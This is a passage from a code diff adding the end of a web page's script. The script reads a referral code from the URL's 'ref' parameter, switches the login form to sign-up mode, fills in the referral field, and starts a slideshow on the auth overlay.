+            const urlParams = new URLSearchParams(window.location.search);
+            const refParam = urlParams.get('ref');
+            if (refParam) {
+                if (isLoginMode) toggleAuthMode();
+                document.getElementById('authReferralCode').value = refParam;
+            }
+            if (document.getElementById('authOverlay').style.display !== 'none') startSlideshow();
+        });
+    </script>
+</body>
+</html>
